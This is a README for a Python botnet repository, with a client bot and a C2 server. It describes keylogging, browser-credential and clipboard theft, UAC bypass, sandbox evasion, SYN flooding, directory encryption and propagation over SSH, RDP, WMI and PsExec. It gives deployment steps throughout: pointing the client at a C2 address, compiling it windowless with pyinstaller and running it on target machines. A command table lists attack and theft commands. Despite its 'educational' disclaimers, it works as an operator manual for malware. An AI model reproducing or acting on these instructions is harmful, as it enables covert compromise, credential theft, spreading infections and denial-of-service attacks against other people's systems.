
# Advanced Botnet Implementation

**Warning: This is for educational and research purposes only. Unauthorized use is illegal.**

GitHub Repository: [https://github.com/Rjkumarkumawat/Advanced-Botnet-Implementation.git](https://github.com/Rjkumarkumawat/Advanced-Botnet-Implementation.git)

## Table of Contents
- [Description](#description)
- [Features](#features)
- [Prerequisites](#prerequisites)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [Command Reference](#command-reference)
- [Security Warning](#security-warning)
- [Legal Disclaimer](#legal-disclaimer)

## Description
This repository contains a proof-of-concept botnet with advanced features designed for cybersecurity education and research. It demonstrates modern malware techniques while emphasizing the importance of defense mechanisms.

## Features

### Client Malware
- Persistence mechanisms (Startup folder, Registry)
- Privilege escalation (UAC bypass)
- Anti-analysis techniques (Sandbox detection, Polymorphic code)
- Encrypted C2 communication (AES-256-CBC)
- Surveillance capabilities (Keylogging, Clipboard theft)
- Credential theft (Browser password extraction)
- Network attack tools (SYN flood, Port scanning)
- Self-propagation (SSH, RDP, WMI, PsExec)

### C2 Server
- Multi-client management
- Interactive shell for each bot
- Broadcast commands
- Encrypted communication
- Session persistence

---

## 🧠 Architecture

```plaintext
┌───────────────┐      AES Encrypted     ┌───────────────┐
│   Client Bot  │◄──────────────────────►│     Server    │
│(victim.py)    │      TCP Socket        │ (C2 Panel)    │
└───────────────┘                        └───────────────┘
```

---

## Prerequisites

### For Server:
- Python 3.6+
- Linux/Windows OS
- Administrator/root privileges (recommended)
- Required Python packages:
  ```
  pip install termcolor pycryptodome
  ```

### For Client:
- Python 3.6+
- Windows OS (primary support)
- Required Python packages:
  ```
  pip install pycryptodome pynput paramiko scapy psutil pywin32 pyperclip netifaces wmi
  ```

## Installation

### 1. Clone the Repository
```bash
git clone https://github.com/Rjkumarkumawat/Advanced-Botnet-Implementation.git
cd Advanced-Botnet-Implementation
```

### 2. Server Setup
1. Navigate to server directory:
   ```bash
   cd server
   ```
2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```
3. Modify configuration (if needed) in `server.py`:
   ```python
   # Change default port if needed
   sock.bind(('0.0.0.0', 4444))  # Line 154
   ```

### 3. Client Setup
1. Navigate to client directory:
   ```bash
   cd client
   ```
2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```
3. Modify configuration in `client.py`:
   ```python
   # Change C2 server IP (line 442)
   server('192.168.1.102', 4444)  # Replace with your server IP
   ```

## Configuration

### Server Configuration Options:
- Edit `server.py` to change:
  - Listening port (default: 4444)
  - Encryption key (AES_KEY and AES_IV - change for production)
  - Timeout settings

### Client Configuration Options:
- Edit `client.py` to change:
  - C2 server IP and port
  - Persistence methods
  - Anti-analysis thresholds
  - Propagation credentials

## Usage

### Starting the C2 Server
```bash
python server.py
```
Expected output:
```
[+] Waiting for targets to connect....
```

### Deploying the Client
1. Compile to executable (optional):
   ```bash
   pyinstaller --onefile --noconsole client.py
   ```
2. Run on target machine:
   ```bash
   python client.py
   ```
   Or if compiled:
   ```bash
   ./client
   ```

### Basic Workflow
1. Start server on your machine
2. Deploy client to target machines
3. When clients connect, use `targets` command to list them
4. Use `session [n]` to interact with specific client
5. Use `sendall [command]` for broadcast commands

## Command Reference

### Server Commands
| Command | Description |
|---------|-------------|
| `targets` | List all connected bots |
| `session [n]` | Connect to session number n |
| `sendall [cmd]` | Send command to all connected bots |
| `clear` | Clear the terminal screen |
| `help` | Show help information |
| `quit` | Shutdown the server |

### Bot Commands
| Command | Description |
|---------|-------------|
| **System Commands** |
| `check_priv` | Check administrator privileges |
| `reboot` | Reboot the system |
| `turn_off` | Shutdown the system |
| **Surveillance** |
| `start_keylogger` | Start capturing keystrokes |
| `stop_keylogger` | Stop keylogger |
| `steal_clipboard` | Get clipboard contents |
| `steal_info` | Get system information |
| `network_info` | Get network interface info |
| **Credential Theft** |
| `steal_creds` | Extract browser passwords |
| **File Operations** |
| `download [file]` | Download file from target |
| `upload [file]` | Upload file to target |
| `encrypt_dir [dir]` | Encrypt directory contents |
| `decrypt_dir [dir]` | Decrypt directory contents |
| **Network Attacks** |
| `syn_flood [ip] [port]` | Start SYN flood attack |
| `stop_syn_flood` | Stop SYN flood |
| `port_scan [ip] [start] [end]` | Advanced port scan |
| `scan_network [range]` | Scan network for hosts |
| `spread [range]` | Attempt to propagate to other hosts |

## Security Warning
⚠️ **This is malware for educational purposes only.** ⚠️

- Do not use against systems you don't own
- Use only in controlled lab environments
- Keep isolated from production networks
- The authors assume no liability for misuse

## Legal Disclaimer
THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU. SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

THE DEVELOPERS ARE NOT RESPONSIBLE FOR ANY DAMAGES CAUSED BY THIS SOFTWARE, INCLUDING BUT NOT LIMITED TO DIRECT, INDIRECT, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM.
